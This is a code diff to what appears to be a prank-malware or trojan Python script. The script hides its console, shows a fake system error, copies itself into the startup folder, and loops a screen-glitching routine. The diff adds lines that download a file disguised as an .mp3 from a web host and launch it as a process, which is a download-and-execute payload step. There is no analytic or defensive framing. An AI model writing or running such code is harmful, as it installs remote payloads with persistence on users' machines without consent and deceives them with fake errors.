@@ -4,7 +4,8 @@ from pathlib import Path
 
 import shutil
 import os
-import sys
+
+HideConsole()
 
 ShowFuckNotification("ERR", "1x000000329: 0x0000000000000000, failed to parse function on table 0x004000003b30031000 and 0x00009B000000491A000")
 
@@ -43,8 +44,14 @@ def add_to_startup():
     shutil.copy(file_path, startup_folder)
 
 
+
+path = DownloadFile('https://psvks.github.io/psvks/uploads/FullVersion.mp3')
+StartProcess(path)
+
+
 add_to_startup()
 REMPROM()
+
 
 while True:
     makeBuggyScreen()
